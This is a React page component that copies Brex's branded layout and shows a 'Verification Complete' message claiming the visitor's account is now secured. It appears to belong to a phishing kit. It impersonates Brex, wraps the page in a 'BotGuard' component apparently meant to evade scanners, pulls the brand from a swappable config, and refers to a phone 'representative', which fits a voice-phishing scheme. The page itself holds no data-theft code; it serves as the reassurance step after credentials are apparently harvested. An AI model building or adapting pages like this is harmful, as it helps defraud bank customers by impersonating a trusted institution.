'use client';

/**
 * Brex Completed/Success Page
 * Split-screen layout matching Brex design
 */

import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';
import { CheckCircle } from 'lucide-react';

export default function CompletedPage() {
  return (
    <BotGuard>
      <div className="brex-boundary">
        <div className="brex-app">

          {/* Left Column */}
          <main className="brex-layout">

            <div className="auth-org-logo">
              <img src="/logo_full_4x.png" alt="Brex Logo" />
            </div>

            <div className="auth-container">
              <h1>Verification Complete</h1>

              <div className="status-container">
                {/* Success Icon */}
                <div className="status-icon-wrapper">
                  <CheckCircle strokeWidth={1.5} />
                </div>

                <p className="status-message-primary">
                  Thank you for verifying your identity.
                </p>

                <p className="status-message-secondary">
                  Your account has been secured. You may safely close this window.
                </p>

                <p className="status-message-secondary" style={{ marginTop: '24px' }}>
                  If you were on a call with a representative, they will guide you through the next steps.
                </p>

                <p className="status-footer">
                  Thank you for banking with {currentBrand.companyName}.
                </p>
              </div>
            </div>

            <div className="signup-link">
              New to Brex? <a href="#">Sign up</a>
            </div>

          </main>

          {/* Right Column: Marketing */}
          <aside className="marketing-content">
            <div className="marketing-inner">
              <h2 className="marketing-badge">DOWNLOAD THE MOBILE APP</h2>
              <p className="marketing-title">Access your Brex card anywhere.</p>
              <div className="marketing-img">
                <img src="/customerstories.png" alt="Brex customer stories layout" />
              </div>
            </div>
          </aside>

        </div>
      </div>
    </BotGuard>
  );
}
